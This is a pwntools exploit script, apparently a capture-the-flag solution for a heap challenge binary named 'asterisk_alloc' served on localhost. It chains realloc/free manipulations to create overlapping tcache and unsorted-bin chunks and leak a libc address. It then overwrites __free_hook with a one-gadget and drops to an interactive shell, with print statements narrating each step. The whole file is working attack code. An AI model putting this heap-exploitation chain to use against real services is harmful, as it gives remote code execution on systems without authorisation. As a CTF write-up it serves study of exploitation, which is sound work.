from pwn import *


def debug(func):
    def wrapper(*args, **kwargs):
        print "{}({}, {})".format(func.__name__, str(args), str(kwargs))
        return func(*args, **kwargs)
    return wrapper


@debug
def malloc(size, data):
    io.recvuntil('choice: ')
    io.sendline('1')

    io.recvuntil('Size: ')
    io.sendline(str(size))

    io.recvuntil('Data: ')
    io.send(data)


@debug
def calloc(size, data):
    io.recvuntil('choice: ')
    io.sendline('2')

    io.recvuntil('Size: ')
    io.sendline(str(size))

    io.recvuntil('Data: ')
    io.send(data)


@debug
def realloc(size, data='A'):
    io.recvuntil('choice: ')
    io.sendline('3')

    io.recvuntil('Size: ')
    io.sendline(str(size))

    io.recvuntil('Data: ')
    io.send(data[:size])


@debug
def free(which):
    io.recvuntil('choice: ')
    io.sendline('4')

    io.recvuntil('Which: ')
    io.sendline(which)


binpath = './asterisk_alloc'
context.binary = binpath
context.terminal = ['tmux', 'split-w', '-h']

elf = ELF('./asterisk_alloc')
libc = elf.libc

gdbscript = '''
gef
b *0x555555554da5

set $ptr_r=(0x202030+0x0000555555554000)
set $ptr_m=(0x202038+0x0000555555554000)
set $ptr_c=(0x202040+0x0000555555554000)
'''

io = None
def solve():
    global io
    # io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
    io = process(binpath)
    io = remote('localhost', 4088)

    print 'Create unsorted bin'
    realloc(0x600)
    realloc(0x5e0)
    realloc(0x68)

    print 'Create space in unsorted bin for chunk which will be linked to tcache'
    realloc(0x68 + 0x80)

    print 'Free chunk which will overlap beginning of unsorted bin'
    free('r')

    print 'Link beginning of unsorted bin to tcache (bin size = 0x80)'
    realloc(0x68)

    print 'Allocate beginning of unsorted bin'
    realloc(0)
    realloc(0x78)

    print 'Free and adjust size, so the chunk will be the same size as it was before,'
    print 'which is required to bypass size check (i think)'
    free('r')
    realloc(0x578)

    print ''
    print 'Now tcache entry will be the size of an unsorted bin chunk'
    print 'Freeing chunk connected to tcache (which is now the size of unsorted bin chunk),'
    print 'will connect the main_arena to tcache entries[0x80]'
    print '(realloc(0) will free pointer and return NULL)'
    print '(realloc(-1) will do nothing and just return NULL)'
    realloc(0)
    print ''

    # payload = 'A' * 0x68 + p64(0x81) + '\x88\x07\xdd'  # For gdb
    payload = 'A' * 0x68 + p64(0x81) + '\x88\x57'
    realloc(0xe8, payload)
    realloc(0)

    realloc(0x78)
    malloc(0x78, '\xf8')

    data = io.recvuntil('malloc')
    print hexdump(data)
    addr_libc = u64(data[5:5+8]) - 0x3ed8c0
    print 'addr_libc = 0x{:x}'.format(addr_libc)

    print 'Now that we have addr_libc overwrite __free_hook with system'
    realloc(0x700)
    realloc(0x6e0)
    realloc(0x58 + 0x60)
    free('r')
    realloc(0x58)
    realloc(-1)

    payload = 'B' * 0x58 + p64(0x81) + p64(addr_libc + libc.symbols['__free_hook'])
    realloc(0x58 + 0x60, payload)

    realloc(-1)
    realloc(0x58)
    realloc(-1)
    realloc(0x58, p64(addr_libc + 0x4f322))

    free('r')

    io.interactive()


if __name__ == '__main__':
    while True:
        try:
            solve()
        except EOFError:
            # io.kill()
            continue
